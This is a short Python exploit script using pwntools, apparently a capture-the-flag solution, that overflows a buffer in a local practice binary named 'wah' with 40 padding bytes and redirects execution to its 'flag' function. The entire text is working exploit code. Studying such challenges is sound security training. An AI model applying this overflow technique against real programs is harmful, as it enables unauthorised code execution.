from pwn import *

p = process("./wah")
e = ELF("./wah")

p.sendline("A"*40 + p64(e.sym["flag"]))

p.interactive()